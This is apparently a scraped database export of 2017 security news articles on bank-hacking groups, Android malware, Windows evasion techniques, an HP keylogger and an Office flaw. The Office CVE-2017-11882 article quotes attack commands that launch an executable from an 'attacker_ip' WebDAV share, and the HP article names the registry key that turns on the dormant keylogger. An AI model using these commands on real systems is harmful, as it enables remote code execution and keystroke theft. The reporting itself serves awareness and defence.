based on a list received from their server. How to Protect Your Device From Such Malicious Apps All the apps, including the credential-stealing apps (detected as Trojan-PSW.AndroidOS.MyVk.o) and malicious Telegram clients (detected as not-a-virus:HEUR:RiskTool.AndroidOS.Hcatam.a), have since been removed by Google from the Play Store. However, those who have already installed one of the above apps on their mobile devices should make sure their devices have Google Play Protect enabled. Play Protect is Google's newly launched security feature that uses machine learning and app usage analysis to remove (uninstall) malicious apps from users Android smartphones to prevent further harm. Although it is a never-ending concern, the best way to protect yourself is always to be vigilant when downloading apps from Google's official Play Store, and always verify app permissions and reviews before you download one. Moreover, you are strongly advised to always keep a good antivirus app on your mobile device that can detect and block such malicious apps before they can infect your device, and always keep your device and apps up-to-date." }

Moscow-based security firm Group-IB published a 36-page report on Monday, providing details about the newly-disclosed hacking group, dubbed MoneyTaker, which has been operating since at least May 2016. In the past 18 months, the hacking group is believed to have conducted more than 20 attacks against various financial organisations—stolen more than $11 Million and sensitive documents that could be used for next attacks. According to the security firm, the group has primarily been targeting card processing systems, including the AWS CBR (Russian Interbank System) and SWIFT international bank messaging service (United States). \"Criminals stole documentation for OceanSystems’ FedLink card processing system, which is used by 200 banks in Latin America and the US.\" Group-IB says in its report. Group-IB also warned that the MoneyTaker attacks against financial organizations appear to be ongoing and banks in Latin America could be their next target. MoneyTaker: 1.5 Years of Silent Operations Since its first successful attack in May last year, MoneyTaker has targeted banks in California, Illinois, Utah, Oklahoma, Colorado, South Carolina, Missouri, North Carolina, Virginia and Florida, primarily targeting small community banks with limited cyber defenses. Even after a large number of attacks against so many targets, MoneyTaker group managed to keep their activities concealed and unattributed by using various publicly available penetration testing and hacking tools, including Metasploit, NirCmd, psexec, Mimikatz, Powershell Empire, and code demonstrated as proof-of-concepts at a Russian hacking conference in 2016. \"To propagate across the network, hackers used a legitimate tool psexec, which is typical for network administrators.\" Group-IB says in its report. Besides using open-source tools, the group has also been heavily utilizing Citadel and Kronos banking trojans to deliver a Point-of-Sale (POS) malware, dubbed ScanPOS. \"Upon execution, ScanPOS grabs information about the current running processes and collects the user name and privileges on the infected system. That said, it is primarily designed to dump process memory and search for payment card track data. The Trojan checks any collected data using Luhn’s algorithm for validation and then sends it outbound to the C&C server.\" \"The group uses 'fileless' malware only existing in RAM and is destroyed after reboot. To ensure persistence in the system MoneyTaker relies on PowerShell and VBS scripts - they are both difficult to detect by antivirus and easy to modify. In some cases, they have made changes to source code 'on the fly' – during the attack,\" \"To escalate privileges up to the local administrator (or SYSTEM local user), attackers use exploit modules from the standard Metasploit pack, or exploits designed to bypass the UAC technology. With local administrator privileges they can use the Mimikatz program, which is loaded into the memory using Meterpreter, to extract unencrypted Windows credentials.\" Moreover, MoneyTaker also makes use of SSL certificates generated using names of well-known brands—including as Bank of America, Microsoft, Yahoo and Federal Reserve Bank—to hide its malicious traffic. The hacking group also configure their servers in a way that malicious payloads can only be delivered to a predetermined list of IP addresses belonging to the targeted company. Also, it relies on PowerShell and VBS scripts to ensure persistence in the targeted system. The very first attack, which Group-IB attributes to MoneyTaker was conducted in May 2016, when the group managed to gain access to First Data's STAR—the largest U.S. bank transfer messaging system connecting ATMs at over 5,000 organizations—and stole money. In January 2017, the similar attack was repeated against another bank. Here's how the attack works: \"The scheme is extremely simple. After taking control over the bank's network, the attackers checked if they could connect to the card processing system. Following this, they legally opened or bought cards of the bank whose IT system they had hacked,\" Group-IB explains. \"Money mules – criminals who withdraw money from ATMs – with previously activated cards went abroad and waited for the operation to begin. After getting into the card processing system, the attackers removed or increased cash withdrawal limits for the cards held by the mules.\" The money mules then removed overdraft limits, which made it possible for them to overdraw cash even with debit cards. Using these cards, they \"withdrew cash from ATMs, one by one.\" According to the report, the average money stolen by MoneyTaker from United States banks alone was about $500,000, and more than $3 million was stolen from at least three Russian banks. The report also detailed an attack against a Russian bank, wherein the MoneyTaker group used a modular malware program to target the AWS CBR (Automated Work Station Client of the Russian Central Bank)—a Russian interbank fund transfer system similar to SWIFT. The modular tool had capabilities to search for payment orders and modify them, replace original payment details with fraudulent ones, and carefully erase malware traces after completing its tasks. While it is still unclear how MoneyTaker managed to get its foothold in the corporate network, in one specific case, the entry point of compromise of the bank's internal network was the home computer of the bank's system administrator. Group-IB believes that the hackers are now looking for ways to compromise the SWIFT interbank communication system, although it found no evidence of MoneyTaker behind any of the recent cyber attacks on SWIFT systems." }

So, here we go with the list of this Week's Top Stories: Process Doppelgänging: New Malware Evasion Technique A team of researchers, who previously discovered AtomBombing attack, recently revealed a new fileless code injection technique that could help malware authors defeat most of the modern anti-virus solutions and forensic tools. Dubbed Process Doppelgänging, the method takes advantage of a built-in Windows function and an undocumented implementation of Windows process loader, and works on all versions of Microsoft Windows operating system, starting from Windows Vista to the latest version of Windows 10. To know How Process Doppelgänging attack works and why Microsoft refused to fix it, Read More. Android Flaw Lets Hackers Inject Malware Into Apps Without Altering Signatures A newly discovered vulnerability, dubbed Janus, in Android could let attackers modify the code of Android apps without affecting their signatures, eventually allowing them to distribute malicious update for the legitimate apps, which looks and works same as the original apps. Although Google has patched the vulnerability this month, a majority of Android users would still need to wait for their device manufacturers to release custom updates for them, apparently leaving a large number of Android users vulnerable to hackers for next few months. To know more about the vulnerability, how it works and if you are affected, Read More. Pre-Installed Keylogger Found On Over 460 HP Laptop Models Once again, Hewlett-Packard (HP) was caught pre-installing a keylogger in more than 460 HP Notebook laptop models that could allow hackers to record your every keystroke and steal sensitive data, including passwords, account information, and credit card details. When reported last month, HP acknowledged the presence of the keylogger, saying it was actually \"a debug trace\" which was left accidentally, and affected users can install updated Synaptics touchpad driver to remove it manually. To know how to check if your HP laptop is vulnerable to this issue and download compatible drivers, Read More. New Email Spoofing Flaw Affects Over 30 Popular Email Clients Researchers discovered a collection of vulnerabilities in more than 30 popular email client applications that could allow anyone to send spoofed emails bypassing anti-spoofing mechanisms. Dubbed MailSploit, the vulnerabilities affect popular email clients including Apple Mail (for macOS, iOS, and watchOS), Mozilla Thunderbird, Yahoo Mail, ProtonMail, several Microsoft email clients, and others.

Largest Crypto-Mining Exchange Hacked; Over $80 Million in Bitcoin Stolen Last week was the golden week in Bitcoin's history when the price of 1 BTC touched almost $19,000, but the media hype about the bitcoin price diminishes the hack of the largest Bitcoin mining marketplace. NiceHash mining marketplace confirmed a breach of its website, which resulted in the theft of more than 4,736 Bitcoins, which now worth nearly $80 million. The service went offline (and is still offline at the time of writing this article) with a post on its website, confirming that \"there has been a security breach involving NiceHash website,\" and that hackers stole the contents of the NiceHash Bitcoin wallet. To know more about the Bitcoin hack, Read More. Microsoft Issues Emergency Windows Security Update A week before its December Patch Tuesday updates, Microsoft released an emergency security patch to address a critical remote code execution vulnerability in its Malware Protection Engine (MPE) that could allow an attacker to take full control of a victim's PC. The vulnerability (CVE-2017-11937) impacts Windows 10, Windows 8.1, Windows 7, Windows RT 8.1, and Windows Server, and affects several Microsoft's security products, including Windows Defender, Microsoft Security Essentials, Endpoint Protection, Forefront Endpoint Protection, and Exchange Server 2013 and 2016. To know more about the vulnerability, Read More. Security Flaw Left Major Banking Apps Vulnerable to MiTM Attacks Over SSL Scientists discovered a critical implementation flaw in major mobile banking apps—for both iOS and Android—that left banking credentials of millions of users vulnerable to man-in-the-middle attacks. Attackers, connected to the same network as the victim, could have leveraged vulnerable banking apps to intercept SSL connection and retrieve the user's banking credentials, like usernames and passwords/pincodes—even if the apps are using SSL pinning feature. To know how attackers could have exploited this vulnerability to take over your bank accounts, Read More. Massive Data Breach Exposes Personal Data On 31 Million Users While downloading apps on their smartphones, most users may not realize how much data they collect on them, and app developers take advantage of this ignorance, wiping off more data on their users than they actually require for the working of their app. But what if this data falls into the wrong hand? The same happened last week, when a massive trove of personal data (over 577 GB) belonging to more than 31 million users of the famous virtual keyboard app, called AI.type, leaked online for anyone to download without requiring a password. To know more about the data breach incident and what information users lost, Read More. Critical Flaw in Major Android Tools Targets Developers An easily-exploitable vulnerability discovered in Android application developer tools, both downloadable and cloud-based, could allow hackers to steal files and execute malicious code on vulnerable systems remotely. The vulnerability was discovered by security researchers at CheckPoint, who also released a proof of concept (PoC) attack, dubbed ParseDroid, along with a video to demonstrate how the attack works. To watch the video and know how this vulnerability can be exploited, Read More. Uber Paid Florida Hacker $100,000 to Keep Data Breach News Secret It turns out that a 20-year-old Florida man, with the help of another, was responsible for the massive Uber data breach in October 2016 and was paid an enormous amount by the ride-hailing company to destroy the data and keep the data breach incident secret. Last week, Uber announced that a massive data breach last year exposed personal data of 57 million customers and drivers and that it paid two hackers $100,000 in ransom to destroy the information.

At least two times this year, HP laptops were caught with pre-installed keylogger or spyware applications. I was following a tweet made by a security researcher claiming to have found a built-in keylogger in several HP laptops, and now he went public with his findings. A security researcher who goes by the name of ZwClose discovered a keylogger in several Hewlett-Packard (HP) laptops that could allow hackers to record your every keystroke and steal sensitive data, including passwords, account information, and credit card details. The Keylogger was found embedded in the SynTP.sys file, a part of Synaptics touchpad driver that ships with HP notebook computers, leaving more than 460 HP Notebook models vulnerable to hackers. Although the keylogger component is disabled by default, hackers can make use of available open source tools for bypassing User Account Control (UAC) to enable built-in keylogger \"by setting a registry value.\" Here’s the location of the registry key: HKLM\\Software\\Synaptics\\%ProductName% HKLM\\Software\\Synaptics\\%ProductName%\\Default The researcher reported the keylogger component to HP last month, and the company acknowledges the presence of keylogger, saying it was actually \"a debug trace\" which was left accidentally, but has now been removed. \"A potential security vulnerability has been identified with certain versions of Synaptics touchpad drivers that impact all Synaptics OEM partners,\" HP says in its advisory, calling the keylogger as a potential, local loss of confidentiality. \"A party would need administrative privileges in order to take advantage of the vulnerability. Neither Synaptics nor HP has access to customer data as a result of this issue.\" The company has released a Driver update for all the affected HP Notebook Models. If you own an HP laptop, you can look for updates for your model. The list of affected HP notebooks can be found at the HP Support website. This is not the very first time when a keylogger has been detected in HP laptops. In May this year, a built-in keylogger was found in an HP audio driver that was silently recording all of its users' keystrokes and storing them in a human-readable file." }
{ "_id" : { "$oid" : "5b35bd106cefc42b0029349e" }, "Category" : "Malware", "Title" : "Android Flaw Lets Hackers Inject Malware Into Apps Without Altering Signatures", "Address" : "https://thehackernews.com/2017/12/android-malware-signature.html", "Date" : "2017-12-08T22:30:00-11:00", "Article" : "Millions of Android devices are at serious risk of a newly disclosed critical vulnerability that allows attackers to secretly overwrite legitimate applications installed on your smartphone with their malicious versions. Dubbed Janus, the vulnerability allows attackers to modify the code of Android apps without affecting their signature verification certificates, eventually allowing them to distribute malicious update for the legitimate apps, which looks and works same as the original apps. The vulnerability (CVE-2017-13156) was discovered and reported to Google by security researchers from mobile security firm GuardSquare this summer and has been patched by Google, among four dozen vulnerabilities, as part of its December Android Security Bulletin. However, the worrisome part is that majority of Android users would not receive these patches for next few month, until their device manufacturers (OEMs) release custom updates for them, apparently leaving a large number of smartphone users vulnerable to hackers. The vulnerability affects apps using APK signature scheme v1 installed on devices running Android versions 5 (Lollipop) and 6 (Marshmallow). Explained: How Android Janus Vulnerability Works? The vulnerability resides in the way Android handles APK installation for some apps, leaving a possibility to add extra bytes of code to an APK file without affecting the application's signature. Before proceeding further, you need to know some basics about an APK file. A valid APK file is a type of archive file, just like Zip, which includes application code, resources, assets, signatures, certificates, and manifest file. Earlier versions of Android operating system 5.0 (Lollipop) and 6.0 (Marshmallow) also support a process virtual machine that helps to execute APK archives containing a compiled version of application code and files, compressed with DEX (Dalvik EXecutable) file format. While installing an Android app or its update, your device checks APK header information to determine if the archive contains code in the compressed DEX files. If header says APK archive contains DEX files, the process virtual machine decompiles the code accordingly and executes it; otherwise, it runs the code as a regular APK file. It turns out that an APK archive can contain DEX files as well as regular application code simultaneously, without affecting its validity and signatures. Researchers find that this ability to add extra bytes of code due to lack of file integrity checking could allow attackers to prepend malicious code compiled in DEX format into an APK archive containing legitimate code with valid signatures, eventually tricking app installation process to execute both code on the targeted device without being detected. In other words, the hack doesn't require attackers to modify the code of legitimate applications (that makes signatures invalid)—instead, the vulnerability allows malware authors to merely add some extra malicious lines of code to the original app. Attack Scenarios After creating malicious but valid versions of legitimate applications, hackers can distribute them using various attack vectors, including spam emails, third-party app stores delivering fake apps and updates, social engineering, and even man-in-the-middle attacks. According to the researchers, it may be \"relatively easy to trick some users because the application can still look exactly like the original application and has the proper signature.\" I find man-in-the-middle attack more interesting, as it could allow hackers to push malicious installation for the apps designed to receive its updates over an unencrypted HTTP connection. \"When the user downloads an update of an application, the Android runtime compares its signature with the signature of the original version. If the signatures match, the Android runtime proceeds to install the update,\" GuardSquare explains. \"The updated application inherits the permissions of the original application. Attackers can, therefore, use the Janus vulnerability to mislead the update process and get an unverified code with powerful permissions installed on the devices of unsuspecting users.\" \"For experts, the common reverse engineering tools do not show the injected code. Users should always be vigilant when downloading applications and updates,\" the security firm added. Since this vulnerability does not affect Android 7 (Nougat) and latest, which supports APK signature scheme version 2, users running older Android versions are highly recommended to upgrade their device OS (if available). It's unfortunate, but if your device manufacturer neither offers security patches nor the latest Android version, then you should not install apps and updates from outside of Google Play Store to minimise the risk of being hacked. Researchers also advised Android developers always to apply signature scheme v2 in order to ensure their apps cannot be tampered with." }
{ "_id" : { "$oid" : "5b35bd156cefc42b0029349f" }, "Category" : "Malware", "Title" : "Process Doppelgänging: New Malware Evasion Technique Works On All Windows Versions", "Address" : "https://thehackernews.com/2017/12/malware-process-doppelganging.html", "Date" : "2017-12-07T00:52:00-11:00", "Article" : "A team of security researchers has discovered a new malware evasion technique that could help malware authors defeat most of the modern antivirus solutions and forensic tools. Dubbed Process Doppelgänging, the new fileless code injection technique takes advantage of a built-in Windows function and an undocumented implementation of Windows process loader. Ensilo security researchers Tal Liberman and Eugene Kogan, who discovered the Process Doppelgänging attack, presented their findings today at Black Hat 2017 Security conference held in London. Process Doppelgänging Works on All Windows Versions Apparently, Process Doppelgänging attack works on all modern versions of Microsoft Windows operating system, starting from Windows Vista to the latest version of Windows 10. Tal Liberman, the head of the research team at enSilo, told The Hacker New that this malware evasion technique is similar to Process Hollowing—a method first introduced years ago by attackers to defeat the mitigation capabilities of security products. In Process Hollowing attack, hackers replace the memory of a legitimate process with a malicious code so that the second code runs instead of the original, tricking process monitoring tools and antivirus into believing that the original process is running. Since all modern antivirus and security products have been upgraded to detect Process Hollowing attacks, use of this technique is not a great idea anymore. On the other hand, Process Doppelgänging is an entirely different approach to achieve the same, by abusing Windows NTFS Transactions and an outdated implementation of Windows process loader, which was originally designed for Windows XP, but carried throughout all later versions of Windows. Here's How the Process Doppelgänging Attack Works: Before going further on how this new code injection attack works, you need to understand what Windows NTFS Transaction is and how an attacker could leverage it to evade his malicious actions. NTFS Transaction is a feature of Windows that brings the concept of atomic transactions to the NTFS file system, allowing files and directories to be created, modified, renamed, and deleted atomically. NTFS Transaction is an isolated space that allows Windows application developers to write file-output routines that are guaranteed to either succeed completely or fail completely. According to the researcher, Process Doppelgänging is a fileless attack and works in four major steps as mentioned below: Transact—process a legitimate executable into the NTFS transaction and then overwrite it with a malicious file. Load—create a memory section from the modified (malicious) file. Rollback—rollback the transaction (deliberately failing the transaction), resulting in the removal of all the changes in the legitimate executable in a way they never existed. Animate—bring the doppelganger to life. Use the older implementation of Windows process loader to create a process with the previously created memory section (in step 2), which is actually malicious and never saved to disk, \"making it invisible to most recording tools such as modern EDRs.\" Process Doppelgänging Evades Detection from Most Antiviruses Liberman told The Hacker News that during their research they tested their attack on security products from Windows Defender, Kaspersky Labs, ESET NOD32, Symantec, Trend Micro, Avast, McAfee, AVG, Panda, and even advance forensic tools. In order to demonstrate, the researchers used Mimikatz, a post-exploitation tool that helps extract credentials from the affected systems, with Process Doppelgänging to bypass antivirus detection. When the researchers ran Mimikatz generally on a Windows operating system, Symantec antivirus solution caught the tool immediately, as shown below: However, Mimikatz ran stealthy, without antivirus displaying any warning when executed using Process Doppelgänging, as shown in the image at top of this article. Liberman also told us that Process Doppelgänging works on even the latest version of Windows 10, except Windows 10 Redstone and Fall Creators Update, released earlier this year. But due to a different bug in Windows 10 Redstone and Fall Creators Update, using Process Doppelgänging causes BSOD (blue screen of death), which crashes users' computers. Ironically, the crash bug was patched by Microsoft in later updates, allowing Process Doppelgänging to run on the latest versions of Windows 10. I don't expect Microsoft to rush for an emergency patch that could make some software relying on older implementations unstable, but Antivirus companies can upgrade their products to detect malicious programs using Process Doppelgänging or similar attacks. This is not the very first time when enSilo researchers have discovered a malware evasion technique. Previously they discovered and demonstrated AtomBombing technique which also abused a designing weakness in Windows OS. In September, enSilo researchers also disclosed a 17-year-old programming error in Microsoft Windows kernel that prevented security software from detecting malware at runtime when loaded into system memory." }

A 27-year-old Michigan man who hacked into the government computer system of Washtenaw County Jail to alter inmate records and gain early release for his friend is now himself facing federal charges after getting caught. Konrads Voits from Ann Arbor, Michigan, pleaded guilty in federal court last week for hacking into the Washtenaw County government computer system earlier this year using malware, phishing, and social engineering tricks in an attempt to get his friend released early from jail. Prosecutors say Voits also used phone calls to prison staff claiming to be a manager at the County Jail's IT department and tricking them into downloading and running malware on their computers by visiting a phony website at \"ewashtenavv.org,\" which mimics the Washtenaw official URL, \"ewashtenaw.org.\" Voit then obtained the remote login information of one of the Jail employees and used that information to install malware on the County's network and gain access to sensitive County's XJail system in March this year. Gaining access to this system eventually allowed Voits to steal jail records of several inmates, search warrant affidavits and personal details, including passwords, usernames, and email addresses, of over 1,600 employees, along with altering electronic records of at least one inmate for early release. However, things did not work as Voits wanted them to, and instead, they all backfired on him when jail employees detected changes in their records and alerted the FBI. No prisoners were then released early. This incident took place between January 24th, 2017 and March 10th, 2017 and cost Washtenaw County more than $235,000 to fix the whole mess before authorities busted Voits. \"Cyber intrusions affect individuals, businesses and governments. Computer hackers should realize that unlawfully entering another's computer will result in a felony conviction and a prison sentence,\" said the United States Attorney Daniel Lemisch. \"We applaud the dedication of so many hard-working law enforcement officers to take away this man's [Voits] ability to intrude into the computer systems of others.\" Voits was arrested by the authorities a month later and pleaded guilty last week. He is now facing a fine of up to $250,000 and a maximum sentence of ten years prison, though he is unlikely to receive the maximum sentence. Voits has agreed to surrender his belongings used during the attack, including his laptop, four cellphones and an undisclosed amount of Bitcoin. Voits is currently in federal custody and is set to face a sentencing hearing on 5 April 2018." }

Andromeda, also known as Win32/Gamarue, is an infamous HTTP-based modular botnet that has been around for several years now, and infecting computers with it's malicious intentions ever since. The primary goal of Andromeda bot is to distribute other malware families for mass global malware attacks. The botnet has been associated with at least 80 malware families, and in the last six months, it was detected (or blocked) on an average of more than 1 million machines per month. Last year, law enforcement agencies took down the criminal infrastructure of the infamous Avalanche botnet in a similar massive international cyber operation. Avalanche botnet was used as a delivery platform to spread other malware families, including Andromeda. While investigating into the Avalanche botnet, information obtained by the German authorities was shared with the Federal Bureau of Investigation (FBI) via Europol, which eventually helped the international agencies to tear down Andromeda just last week. In a joint operation, the international partners took down servers and more than 1,500 web domains which were being used to distribute and control Andromeda malware. \"This is another example of international law enforcement working together with industry partners to tackle the most significant cybercriminals and the dedicated infrastructure they use to distribute malware on a global scale,\" Steven Wilson, the Head of Europol's European Cybercrime Centre (EC3), said. \"The clear message is that public-private partnerships can impact these criminals and make the internet safer for all of us.\" Using sinkholing the now-seized domains, tactic researchers use to redirect traffic from the infected machines to a self-controlled system; authorities found over 2 million unique IP addresses from at least 223 countries associated with Andromeda victims with just 48 hours. Further investigation also helped law enforcement authorities arrest a suspect in Belarus, who was allegedly involved in the Andromeda cybercrime gang. Just last week, Europol seized more than 20,000 web domains for illegally selling counterfeit products, including luxury products, sportswear, electronics, pharmaceuticals and online piracy on e-commerce platforms and social networks in its fight against the online trade of counterfeit goods." }

Google Play Protect—a security feature that uses machine learning and app usage analysis to check devices for potentially harmful apps—recently helped Google researchers to identify a new deceptive family of Android spyware that was stealing a whole lot of information on users. Discovered on targeted devices in African countries, Tizi is a fully-featured Android backdoor with rooting capabilities that installs spyware apps on victims' devices to steal sensitive data from popular social media apps like Facebook, Twitter, WhatsApp, Viber, Skype, LinkedIn, and Telegram. \"The Google Play Protect security team discovered this family in September 2017 when device scans found an app with rooting capabilities that exploited old vulnerabilities,\" Google said in a blog post. \"The team used this app to find more applications in the Tizi family, the oldest of which is from October 2015.\" Most Tizi-infected apps are being advertised on social media websites and 3rd-party app stores, tricking users into installing them. Once installed, the innocent looking app gains root access of the infected device to install spyware, which then first contacts its command-and-control servers by sending an SMS text message with the GPS coordinates of the infected device to a specific number. Here's How Tizi Gains Root Access On Infected Devices For gaining root access, the backdoor exploits previously disclosed vulnerabilities in older chipsets, devices, and Android versions, including CVE-2012-4220, CVE-2013-2596, CVE-2013-2597, CVE-2013-2595, CVE-2013-2094, CVE-2013-6282, CVE-2014-3153, CVE-2015-3636, and CVE-2015-1805. If the backdoor unable to take root access on the infected device due to all the listed vulnerabilities being patched, \"it will still attempt to perform some actions through the high level of permissions it asks the user to grant to it, mainly around reading and sending SMS messages and monitoring, redirecting, and preventing outgoing phone calls, \" Google said. Tizi spyware also been designed to communicate with its command-and-control servers over regular HTTPS or using MQTT messaging protocol to receive commands from the attackers and uploading stolen data. The Tizi backdoor contains various capabilities common to commercial spyware, such as Stealing data from popular social media platforms including Facebook, Twitter, WhatsApp, Viber, Skype, LinkedIn, and Telegram. Recording calls from WhatsApp, Viber, and Skype. Sending and receiving SMS messages. Accessing calendar events, call log, contacts, photos, and list of installed apps Stealing Wi-Fi encryption keys. Recording ambient audio and taking pictures without displaying the image on the device's screen. So far Google has identified 1,300 Android devices infected by Tizi and removed it. Majority of which were located in African countries, specifically Kenya, Nigeria, and Tanzania. How to Protect your Android device from Hackers? Such Android spyware can be used to target your devices as well, so you if own an Android device, you are strongly recommended to follow these simple steps in order to protect yourself: Ensure that you have already opted for Google Play Protect. Download and install apps only from the official Play Store, and always check permissions for each app. Enable 'verify apps' feature from settings. Protect your devices with pin or password lock so that nobody can gain unauthorized access to your device when remains unattended. Keep \"unknown sources\" disabled while not using it. Keep your device always up-to-date with the latest security patches." }
{ "_id" : { "$oid" : "5b35bd216cefc42b002934a3" }, "Category" : "Malware", "Title" : "BankBot Returns On Play Store – A Never Ending Android Malware Story", "Address" : "https://thehackernews.com/2017/11/bankbot-android-malware.html", "Date" : "2017-11-20T06:13:00-11:00", "Article" : "Even after so many efforts by Google for making its Play Store away from malware, shady apps somehow managed to fool its anti-malware protections and infect people with malicious software. A team of researchers from several security firms has uncovered two new malware campaigns targeting Google Play Store users, of which one spreads a new version of BankBot, a persistent family of banking Trojan that imitates real banking applications in efforts to steal users' login details. BankBot has been designed to display fake overlays on legitimate bank apps from major banks around the world, including Citibank, WellsFargo, Chase, and DiBa, to steal sensitive information, including logins and credit card details. With its primary purpose of displaying fake overlays, BankBot has the ability to perform a broad range of tasks, such as sending and intercepting SMS messages, making calls, tracking infected devices, and stealing contacts. Google removed at least four previous versions of this banking trojan from its official Android app store platform earlier this year, but BankBot apps always made their ways to Play Store, targeting victims from major banks around the world. The second campaign spotted by researchers not only spreads the same BankBot trojan as the first campaign but also Mazar and Red Alert. This campaign has been described in detail on ESET blog. According to an analysis performed by the mobile threat intelligence team at Avast in collaboration with ESET and SfyLabs, the latest variant of BankBot has been hiding in Android apps that pose as supposedly trustworthy, innocent-looking flashlight apps. First spotted by the researchers on 13 October, the malicious BankBot apps uses special techniques to circumvent Google's automated detection checks, such as starting malicious activities 2 hours after the user gave device admin rights to the app and publishing the apps under different developer names. After tricking victims into downloading them, the malicious apps check for the applications that are installed on the infected device against a hard-coded, list of 160 mobile apps. According to the researchers, this list includes apps from Wells Fargo and Chase in the U.S., Credit Agricole in France, Santander in Spain, Commerzbank in Germany and many other financial institutions from around the world. If it finds one or more apps on the infected smartphone, the malware downloads and installs the BankBot APK from its command-and-control server on the device, and tries to trick the victim into giving it administrator rights by pretending to be a Play Store or system update using a similar icon and package name. Once it gets the admin privileges, the BankBot app displays overlay on the top of legitimate apps whenever victims launch one of the apps from the malware's list and steal whatever banking info the victim's types on it. The Avast Threat Labs has also provided a video demonstration while testing this mechanism with the app of the local Czech Airbank. You can see how the app creates an overlay within milliseconds and tricks the user into giving out their bank details to criminals. Since many banks use two-factor-authentication methods for secure transactions, BankBot includes functionality that allows it to intercept text messages, allowing criminals behind BankBot to steal mobile transaction number (mTAN) sent to the customer's phone and transfer money to their accounts. Here's one important thing to note is that Android mechanism blocks apps installation from outside the Play Store. Even if you have already permitted installation from unknown sources, Google still requires you to press a button to continue such installations. \"Unlike this newer version of BankBot, droppers from previous campaigns were far more sophisticated,\" the researchers note. \"They applied techniques such as performing clicks in the background via an Accessibility Service to enable the installation from unknown sources.\" The latest BankBot version does not utilize this Accessibility Service feature due to Google's recent move of blocking this feature for all applications, except those designed to provide services for the blind. Google has already removed all recently-discovered BankBot apps after being notified by the researchers. Although it is a never-ending concern, the best way to protect yourself is always to be vigilant when downloading apps even from Google's official Play store. So, always verify app permissions and reviews before downloading an app from Google Play Store. Even though the BankBot apps made it way into the Play Store, its payload was downloaded from an external source. So, don't allow any unknown third-party APK to be installed on your smartphone. To do so, Go to Settings → Security and then Turn OFF \"Allow installation of apps from sources other than the Play Store.\" Most importantly, be careful which apps you give administrative rights to, as it is powerful and can provide a full app control of your device." }

When the world is still dealing with the threat of 'unpatched' Microsoft Office's built-in DDE feature, researchers have uncovered a serious issue with another Office component that could allow attackers to remotely install malware on targeted computers. The vulnerability is a memory-corruption issue that resides in all versions of Microsoft Office released in the past 17 years, including Microsoft Office 365, and works against all versions of Windows operating system, including the latest Microsoft Windows 10 Creators Update. Discovered by the security researchers at Embedi, the vulnerability leads to remote code execution, allowing an unauthenticated, remote attacker to execute malicious code on a targeted system without requiring user interaction after opening a malicious document. The vulnerability, identified as CVE-2017-11882, resides in EQNEDT32.EXE, an MS Office component which is responsible for insertion and editing of equations (OLE objects) in documents. However, due to improper memory operations, the component fails to properly handle objects in the memory, corrupting it in such a way that the attacker could execute malicious code in the context of the logged-in user. Seventeen years ago, EQNEDT32.EXE was introduced in Microsoft Office 2000 and had been kept in all versions released after Microsoft Office 2007 in order to ensure the software remains compatible with documents of older versions. DEMO: Exploitation Allows Full System Take Over Exploitation of this vulnerability requires opening a specially crafted malicious file with an affected version of Microsoft Office or Microsoft WordPad software. This vulnerability could be exploited to take complete control over a system when combined with Windows Kernel privilege escalation exploits (like CVE-2017-11847). Possible Attack Scenario: While explaining the scope of the vulnerability, Embedi researchers suggested several attack scenarios listed below: \"By inserting several OLEs that exploited the described vulnerability, it was possible to execute an arbitrary sequence of commands (e.g., to download an arbitrary file from the Internet and execute it).\" \"One of the easiest ways to execute arbitrary code is to launch an executable file from the WebDAV server controlled by an attacker.\" \"Nonetheless, an attacker can use the described vulnerability to execute the commands like cmd.exe /c start \\\\attacker_ip\\ff. Such a command can be used as a part of an exploit and triggers starting WebClient.\" \"After that, an attacker can start an executable file from the WebDAV server by using the \\\\attacker_ip\\ff\\1.exe command. The starting mechanism of an executable file is similar to that of the \\\\live.sysinternals.com\\tools service.\" Protection Against Microsoft Office Vulnerability With this month's Patch release, Microsoft has addressed this vulnerability by changing how the affected software handles objects in memory. So, users are strongly recommended to apply November security patches as soon as possible to keep hackers and cybercriminals away from taking control of their computers. Since this component has a number of security issues which can be easily exploited, disabling it could be the best way to ensure your system security. Users can run the following command in the command prompt to disable registering of the component in Windows registry: reg add \"HKLM\\SOFTWARE\\Microsoft\\Office\\Common\\COM Compatibility\\{0002CE02-0000-0000-C000-000000000046}\" /v \"Compatibility Flags\" /t REG_DWORD /d 0x400 For 32-bit Microsoft Office package in x64 OS, run the following command: reg add \"HKLM\\SOFTWARE\\Wow6432Node\\Microsoft\\Office\\Common\\COM Compatibility\\{0002CE02-0000-0000-C000-000000000046}\" /v \"Compatibility Flags\" /t REG_DWORD /d 0x400 Besides this, users should also enable Protected View (Microsoft Office sandbox) to prevent active content execution (OLE/ActiveX/Macro)." }

Not just announcement, but the whistleblower organisation has also published its first batch of Vault 8 leak, releasing source code and development logs of Project Hive—a significant backend component the agency used to remotely control its malware covertly. In April this year, WikiLeaks disclosed a brief information about Project Hive, revealing that the project is an advanced command-and-control server (malware control system) that communicates with malware to send commands to execute specific tasks on the targets and receive exfiltrated information from the target machines. Hive is a multi-user all-in-one system that can be used by multiple CIA operators to remotely control multiple malware implants used in different operations. Hive’s infrastructure has been specially designed to prevent attribution, which includes a public facing fake website following multi-stage communication over a Virtual Private Network (VPN). \"Using Hive even if an implant is discovered on a target computer, attributing it to the CIA is difficult by just looking at the communication of the malware with other servers on the internet,\" WikiLeaks says. As shown in the diagram, the malware implants directly communicate with a fake website, running over commercial VPS (Virtual Private Server), which looks innocent when opened directly into the web browser. However, in the background, after authentication, the malware implant can communicate with the web server (hosting fake website), which then forwards malware-related traffic to a \"hidden\" CIA server called 'Blot' over a secure VPN connection. The Blot server then forwards the traffic to an implant operator management gateway called 'Honeycomb.' In order to evade detection by the network administrators, the malware implants use fake digital certificates for Kaspersky Lab. \"Digital certificates for the authentication of implants are generated by the CIA impersonating existing entities,\" WikiLeaks says. \"The three examples included in the source code build a fake certificate for the anti-virus company Kaspersky Laboratory, Moscow pretending to be signed by Thawte Premium Server CA, Cape Town.\" The whistleblowing organisation has released the source code for Project Hive which is now available for anyone, including investigative journalists and forensic experts, to download and dig into its functionalities. The source code published in the Vault 8 series only contains software designed to run on servers controlled by the CIA, while WikiLeaks assures that the organisation will not release any zero-day or similar security vulnerabilities which could be abused by others." }

